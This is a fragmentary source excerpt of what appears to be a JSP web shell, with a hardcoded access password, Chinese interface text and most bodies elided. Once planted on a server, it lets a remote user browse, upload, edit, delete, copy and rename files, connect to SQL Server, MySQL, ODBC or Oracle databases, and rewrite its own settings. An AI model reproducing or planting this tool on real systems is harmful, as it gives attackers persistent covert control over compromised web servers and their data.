...
<%!private String _password = "gaofushuainiubi";
...
public boolean validate(String password) {
		...
		try {
			if (isRoot) {
				...
				try {
					...
					sRet = "<font color=\"red\">bad path \"" + path
							+ "\"</font>";
				}
			}
			...
			if (sRet == null) {
				...
				sRet += "		window.location.href = \""
						+ curUri
						+ "&curPath="
						+ path
						+ "&fsAction=createFolder&folderName=\" + folderName + \""
						+ "\";\n";
				sRet += "	}\n";
				sRet += "}\n";
				sRet += "\n";
				...
				sRet += "		window.location.href = \"" + curUri + "&curPath="
						+ path
						+ "&fsAction=createFile&fileName=\" + fileName + \""
						+ "\";\n";
				sRet += "	}\n";
				sRet += "}\n";
				sRet += "\n";
				...
				sRet += "		document.fileList.action = \"" + curUri
						+ "&curPath=" + path + "&fsAction=copyto&dstPath="
						+ "\" + toPath;\n";
				...
				sRet += "			window.location.href = \""
						...
						+ "&curPath="
						+ path
						+ "&fsAction=rename&newName=\" + newName + \"&fileRename=\" + document.fileList.filesDelete[selected].value;";
				sRet += "		}\n";
				sRet += "	}\n";
				sRet += "}\n";
				sRet += "\n";
				...
				sRet += "	<form enctype=\"multipart/form-data\" method=\"post\" name=\"upload\" action=\""
						+ curUri
						+ "&curPath="
						+ path
						+ "&fsAction=upload"
				...
				if (curFile != null) {
					...
					sRet += "			&nbsp;<a href=\""
							+ curUri
							+ "&curPath="
							+ (curFile.getParent() == null ? ""
									: pathConvert(curFile.getParent()))
							+ "\">上级目录</a>&nbsp;";
				...
				sRet += "	<form name=\"fileList\" method=\"post\" action=\""
				...
				for (n = 0; n < files.length; n++) {
					...
					if (!isRoot) {
						sRet += "		<td width=\"5%\" align=\"center\"><input type=\"checkbox\" name=\"filesDelete\" value=\""
								+ pathConvert(files[n].getPath())
								+ "\" /></td>\n";
						if (files[n].isDirectory()) {
							sRet += "		<td><a href=\"" + curUri + "&curPath="
									+ pathConvert(files[n].getPath())
									+ "\" title=\"" + files[n].getName()
									+ "\">&lt;"
									+ strCut(files[n].getName(), 50)
									+ "&gt;</a></td>\n";
						} else {
							sRet += "		<td><a title=\"" + files[n].getName()
									+ "\">" + strCut(files[n].getName(), 50)
									+ "</a></td>\n";
						}

						sRet += "		<td width=\"15%\" align=\"center\">"
								+ (files[n].isDirectory() ? "&lt;dir&gt;" : "")
								+ ((!files[n].isDirectory())
										&& isTextFile(getExtName(files[n]
												.getPath())) ? "<<a href=\""
										+ curUri + "&curPath="
										+ pathConvert(files[n].getPath())
										+ "&fsAction=open" + "\">edit</a>>"
										: "") + "</td>\n";
						sRet += "		<td width=\"15%\" align=\"center\">"
								+ files[n].length() + "</td>\n";
					} else {
	...
	public String openFile(String path, String curUri) {
		...
		if (canOpen) {
			...
			sRet = "<font color=\"red\">file \""
					+ path
					+ "\" is not a text file, can't be opened in text mode</font>";
		}
		...
		if (fileString != null) {
			...
			sRet += "	var fileName = prompt(\"请输入文件名\", \"\");\n";
			sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
			sRet += "		document.openfile.action=\"" + curUri + "&curPath="
					+ pathConvert(curFile.getParent())
					+ "\" + fileName + \"&fsAction=saveAs\";\n";
			...
			sRet += "	<form name=\"openfile\" method=\"post\" action=\""
					+ curUri + "&curPath=" + path + "&fsAction=save" + "\">\n";
			sRet += "	<tr>\n";
			sRet += "		<td>[<a href=\"" + curUri + "&curPath="
					+ pathConvert(curFile.getParent()) + "\">上级目录</a>]</td>\n";
			sRet += "	</tr>\n";
			sRet += "	<tr>\n";
	...
	public String saveFile(String path, String curUri, String fileContent) {
		...
		try {
			...
			if (!file.canWrite()) {
				...
				sRet += "<meta http-equiv=\"refresh\" content=\"2;url="
						+ curUri + "&curPath=" + path + "&fsAction=open"
						+ "\" />\n";
			}
		} catch (IOException e) {
	...
	public String createFolder(String path, String curUri, String folderName) {
		...
		try {
			...
			if (folder.exists() && folder.isDirectory()) {
				sRet = "<font color=\"red\">\"" + path + folderName
						+ "\"目录已经存在</font>";
			} else {
				if (folder.mkdir()) {
					sRet = "成功创建目录\"" + pathConvert(folder.getPath())
							+ "\"，正在返回，请稍候……\n";
					sRet += "<meta http-equiv=\"refresh\" content=\"2;url="
							+ curUri + "&curPath=" + path + folderName
							+ "\" />";
				} else {
					sRet = "<font color=\"red\">创建目录\"" + folderName
							+ "\"失败</font>";
				}
			}
		} catch (SecurityException e) {
	...
	public String createFile(String path, String curUri, String fileName) {
		...
		try {
			...
			if (file.createNewFile()) {
				sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri
						+ "&curPath=" + path + fileName + "&fsAction=open"
						+ "\" />";
			} else {
				sRet = "<font color=\"red\">\"" + path + fileName
						+ "\"文件已经存在</font>";
			}
		} catch (SecurityException e) {
			sRet = "<font color=\"red\">安全问题，没有权限执行该操作</font>";
		} catch (IOException e) {
			sRet = "<font color=\"red\">创建文件\"" + path + fileName
					+ "\"失败</font>";
		}
	...
	public String deleteFile(String path, String curUri, String[] files2Delete) {
		...
		try {
			for (int i = 0; i < files2Delete.length; i++) {
				...
				if (!tmpFile.delete()) {
					sRet += "<font color=\"red\">删除\"" + files2Delete[i]
							+ "\"失败</font><br>\n";
				}
			}
	...
	public String copyFiles(String path, String curUri, String[] files2Copy,
			String dstPath) {
		String sRet = "";
		int i;
		...
		for (i = 0; i < files2Copy.length; i++) {
			if (!fileCopy(files2Copy[i], dstPath
					+ getFileNameByPath(files2Copy[i]))) {
				sRet += "<font color=\"red\">文件\"" + files2Copy[i]
						+ "\"复制失败</font><br/>";
			}
		}
		...
		if (sRet.equals("")) {
			...
			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri
					+ "&curPath=" + path + "\" />";
		}
	...
	public String renameFile(String path, String curUri, String file2Rename,
			String newName) {
		String sRet = "";
		...
		try {
			...
			newName = file2Rename
					.substring(0, file2Rename.lastIndexOf("/") + 1) + newName;
			File newFile = new File(newName);

			if (!file.exists()) {
				sRet = "<font color=\"red\">文件\"" + file2Rename
						+ "\"不存在</font>";
			} else {
			...
			sRet = "<font color=\"red\">安全问题导致文件\"" + file2Rename
					+ "\"复制失败</font>";
		}
	...
	public boolean DBInit(String dbType, String dbServer, String dbPort,
		...
		try {
			if (dbType.equals("sqlserver")) {
				...
				if (dbPort.equals(""))
					dbPort = "1433";
				_url = "jdbc:microsoft:sqlserver://" + dbServer + ":" + dbPort
				...
				if (dbPort.equals(""))
					dbPort = "3306";
				_url = "jdbc:mysql://" + dbServer + ":" + dbPort + ";User="
						+ dbUsername + ";Password=" + dbPassword
						+ ";DatabaseName=" + dbName;
			} else if (dbType.equals("odbc")) {
				driverName = "sun.jdbc.odbc.JdbcOdbcDriver";
				_url = "jdbc:odbc:dsn=" + dbName + ";User=" + dbUsername
						+ ";Password=" + dbPassword;
			} else if (dbType.equals("oracle")) {
				driverName = "oracle.jdbc.driver.OracleDriver";
				_url = "jdbc:oracle:thin@" + dbServer + ":" + dbPort + ":"
						+ dbName;
	...
	public boolean DBConnect(String User, String Password) {
		...
		if (_url != null) {
			try {
				_dbConnection = DriverManager.getConnection(_url, User,
						Password);
	...
	class JshellConfig {
		...
		public void setPassword(String password) throws JshellConfigException {
			...
			p = Pattern.compile("private\\sString\\s_password\\s=\\s\""
					+ _password + "\"");
			...
			_jshellContent = m.replaceAll("private String _password = \""
					+ password + "\"");
		...
		public void setEncodeType(String encodeType)
			...
			p = Pattern.compile("private\\sString\\s_encodeType\\s=\\s\""
					+ _encodeType + "\"");
			m = p.matcher(_jshellContent);
			...
			_jshellContent = m.replaceAll("private String _encodeType = \""
					+ encodeType + "\"");
			//return HTMLEncode(_jshellContent);
		}
		...
		public void setSessionTime(String sessionTime)
			...
			p = Pattern.compile("private\\sint\\s_sessionOutTime\\s=\\s"
					+ _sessionOutTime);
			m = p.matcher(_jshellContent);
			...
			_jshellContent = m.replaceAll("private int _sessionOutTime = "
					+ sessionTime);
			//return HTMLEncode(_jshellContent);
		}

		public void setTextFileTypes(String[] textFileTypes)
				throws JshellConfigException {
			Pattern p = Pattern.compile("\\w+");
			Matcher m = null;
			int i;
